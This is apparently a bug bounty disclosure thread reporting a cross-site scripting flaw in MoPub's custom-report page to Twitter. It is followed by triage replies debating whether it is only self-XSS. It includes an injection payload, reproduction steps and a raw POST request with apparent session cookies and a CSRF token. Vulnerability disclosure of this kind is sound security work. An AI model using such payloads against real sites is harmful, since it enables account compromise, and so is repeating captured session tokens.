title: XSS on https://app.mopub.com/reports/custom/add/ [new-d1]

profile.name: Twitter
profile.about: Twitter helps you create and share ideas and information instantly, without barriers.

There are two main variants of XSS, stored and reflected, DOM.
vulnerability_information_html:
Parameter
new-d1

Payload
</img><img src=x onerror=alert(domain)>

Steps to reproduce

  1. Go to URL: https://app.mopub.com/reports/custom/add/
  2. Start burp suite proxy, intercept on.
  3. Enter payload in vulnerable parameter.
  4. click on Run and Save button.
  5. You will see java-script getting executed.

POST Request

POST /reports/custom/add/ HTTP/1.1
Host: app.mopub.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://app.mopub.com/reports/custom/
X-CSRFToken: ITzZsPAjFJeRBqKUKodU5C4w2lu2x5MG7Gec9L8jtqMOVilWX7gPTxwsXcgIloIR
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------200821510612490
Content-Length: 1690
Connection: close
Cookie: _gcl_au=1.1.1687186367.1563287045; _ga=GA1.2.1543739358.1563287048; csrftoken=ITzZsPAjFJeRBqKUKodU5C4w2lu2x5MG7Gec9L8jtqMOVilWX7gPTxwsXcgIloIR; mp__mixpanel=%7B%22distinct_id%22%3A%20%2216bfb2ba1103c5-0143fdd5f3a3c58-4c312f7f-e1000-16bfb2ba111485%22%2C%22%24device_id%22%3A%20%2216bfb2ba1103c5-0143fdd5f3a3c58-4c312f7f-e1000-16bfb2ba111485%22%2C%22accountKey%22%3A%20%22%22%2C%22accessLevel%22%3A%20%22%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.mopub.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.mopub.com%22%7D; mp_mixpanel__c=1; sessionid=p49r0bbeqb3laimfoii6vcny4yxbv6ww; mp_c99579c4804fba6b8aeed7a911581652_mixpanel=%7B%22distinct_id%22%3A%20%22d897f99976a646f5a619e52ed44bbb80%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fapp.mopub.com%2Faccount%2Flogin%2F%3Fnext%3D%2Fdashboard%2F%22%2C%22%24initial_referring_domain%22%3A%20%22app.mopub.com%22%2C%22accessLevel%22%3A%20%22member%22%2C%22accountKey%22%3A%20%22aeb905f4d0984a02be8a00d27aae73df%22%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%2C%22%24user_id%22%3A%20%22d897f99976a646f5a619e52ed44bbb80%22%2C%22%24had_persisted_distinct_id%22%3A%20true%2C%22%24device_id%22%3A%20%22285f16e8e3a64ffc9bcc629faccb3d23%22%7D

Impact

Cross-site scripting is a flaw that allows users to inject HTML or JavaScript code into a page enabling arbitrary input. There are two main variants of XSS, stored and reflected, DOM.

activities.message:
Thank you for your report @c00lbugs,

We were able to reproduce the behavior you described, but this behavior appears to be a self-XSS attack. While this may not be ideal behavior, it does not appear to pose a security risk to other users on Mopub.  Can you provide us an attack scenario with steps to reproduce that demonstrates how an attacker can use this behavior against another user on Mopub?

Thank you for thinking of Twitter security
activities.markdown_message:
Thank you for your report @c00lbugs,

While this may not be ideal behavior, it does not appear to pose a security risk to other users on Mopub. Can you provide us an attack scenario with steps to reproduce that demonstrates how an attacker can use this behavior against another user on Mopub?

Thank you for thinking of Twitter security

activities.message:
Thank you for your response @bugtriage-sophia and

Correction : This is Reflected XSS

I apologized its my mistake, it's Reflected XSS and its can be execute for once after inject the javascript payload, and it have same impact what have impact of another Reflected XSS

https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)

**Reflected XSS**

```
Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other website. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser. The browser then executes the code because it came from a "trusted" server. Reflected XSS is also sometimes referred to as Non-Persistent or Type-II XSS.
```
Hope you understand, what i want to say, let me know if you have any questions.

Thank you :)

Reflected XSS

Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other website. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser. The browser then executes the code because it came from a "trusted" server. Reflected XSS is also sometimes referred to as Non-Persistent or Type-II XSS.

activities.message:
Thank you for your response @c00lbugs,

As we stated above, it seems that an attacker cannot leverage this behavior to impact another user. According to our tests, the Reflective XSS payload you demonstrated cannot be saved to the reports page. If this is the case, this attack cannot be used to impact other users on Mopub. Can you save this XSS payload onto the reports page? Can you provide us an attack scenario which describes how this attack could affect a victim?

Thank you for thinking of Twitter security.

Can you save this XSS payload onto the reports page? Can you provide us an attack scenario which describes how this attack could affect a victim?

Thank you for thinking of Twitter security.

activities.message:
Thank you for your response @bugtriage-sophia 

Can you please explain which type of Information you required for Identify or Resolve the Vulnerability.?

And if you are asking regarding Reflected XSS Impact then for that as a normal behavior. it should be required to inject malicious JavaScript every time. in this application attacker can't be execute JavaScript remotely. user need to add on the Web application request.

https://portswigger.net/blog/xss-in-hidden-input-fields

activities.message:
Thank you for your follow-up @c00lbugs,

Typically, our program does not accept Self-XSS attacks which require the victims to modify their own HTTP requests. However, in this case, we want to perform an in-depth evaluation to ensure that this behavior cannot be used in future attacks. We will get back to you as soon as we have more information about this report.

Thank you for thinking of Twitter security.
activities.markdown_message:
Thank you for your follow-up @c00lbugs,

Typically, our program does not accept Self-XSS attacks which require the victims to modify their own HTTP requests. However, in this case, we want to perform an in-depth evaluation to ensure that this behavior cannot be used in future attacks. We will get back to you as soon as we have more information about this report.

Thank you for thinking of Twitter security.

activities.message:
Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.

Thank you for helping keep Twitter secure!
activities.markdown_message:
Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.

Thank you for helping keep Twitter secure!

activities.message: Thanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.
